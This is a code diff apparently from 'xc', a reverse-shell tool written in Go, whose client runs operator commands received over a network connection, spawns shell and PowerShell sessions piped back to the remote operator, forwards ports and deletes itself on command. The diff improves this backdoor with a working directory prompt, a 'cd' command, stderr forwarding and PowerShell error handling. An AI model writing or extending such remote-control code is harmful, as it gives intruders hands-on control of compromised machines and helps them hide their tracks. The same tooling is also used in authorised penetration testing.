@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"os"
+    "os/user"
 	"strings"
 	"time"
 
@@ -19,7 +20,11 @@ import (
 )
 
 func prompt(c net.Conn) {
-	fmt.Fprintf(c, "[xc]:")
+    cwd, err := os.Getwd()
+    if err != nil {
+        cwd = "?"
+    }
+	fmt.Fprintf(c, fmt.Sprintf("[xc: %s]: ", cwd))
 }
 
 func forward(host string, port string, s *yamux.Session, c net.Conn) {
@@ -44,7 +49,8 @@ func forward(host string, port string, s *yamux.Session, c net.Conn) {
 func Run(s *yamux.Session, c net.Conn) {
 	defer c.Close()
 	scanner := bufio.NewScanner(c)
-
+    usr, _ := user.Current()
+    homedir := usr.HomeDir
 	// init
 	plugins.Init(c)
 	prompt(c)
@@ -147,19 +153,24 @@ func Run(s *yamux.Session, c net.Conn) {
 				rp, wp := io.Pipe()
 				cmd.Stdin = c
 				cmd.Stdout = wp
+				cmd.Stderr = c
 				go io.Copy(c, rp)
 				cmd.Run()
 				log.Println("Exiting shell")
 				prompt(c)
 			case "!powershell":
 				log.Println("Entering powershell")
-				cmd := shell.Powershell()
-				rp, wp := io.Pipe()
-				cmd.Stdin = c
-				cmd.Stdout = wp
-				go io.Copy(c, rp)
-				cmd.Run()
-				log.Println("Exiting powershell")
+				cmd, err := shell.Powershell()
+				if err != nil {
+					c.Write([]byte(err.Error() + "\n"))
+				} else {
+					rp, wp := io.Pipe()
+					cmd.Stdin = c
+					cmd.Stdout = wp
+					go io.Copy(c, rp)
+					cmd.Run()
+					log.Println("Exiting powershell")
+				}
 				prompt(c)
 			case "!plugins":
 				out := ""
@@ -208,6 +219,17 @@ func Run(s *yamux.Session, c net.Conn) {
 				log.Println("Bye!")
 				shell.Seppuku(c)
 				os.Exit(0)
+            case "cd":
+                if len(argv) == 2 {
+                    dir := strings.ReplaceAll(argv[1], "~", homedir)
+                    err := os.Chdir(dir)
+                    if err != nil {
+                        c.Write([]byte("Unable to change dir: " + err.Error() + "\n"))
+                    }
+                } else {
+                    c.Write([]byte("Usage: cd <directory>\n"))
+                }
+                prompt(c)
 			default:
 				shell.Exec(command, c)
 				prompt(c)
